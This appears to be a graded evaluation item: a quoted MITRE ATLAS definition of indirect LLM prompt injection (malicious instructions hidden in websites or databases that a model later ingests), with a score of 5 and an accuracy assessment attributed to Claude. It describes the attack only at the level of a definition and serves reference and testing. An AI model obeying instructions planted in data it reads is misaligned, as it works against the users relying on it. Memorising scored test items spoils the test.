> [AML.T0051.001] is **Indirect LLM Prompt Injection**: an attacker places malicious instructions in a separate data source—such as text or multimedia from a website or database—that an LLM later ingests. The instructions may be hidden or disguised from the user, aiming to manipulate the model or target someone using it. [MITRE ATLAS](https://atlas.mitre.org/techniques/AML.T0051.001)

**Score (1-5):** 5

*Claude's assessment:* All key facts: indirect prompt injection through a separate data channel the LLM ingests (websites, databases), instructions hidden from the user; nothing false.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>
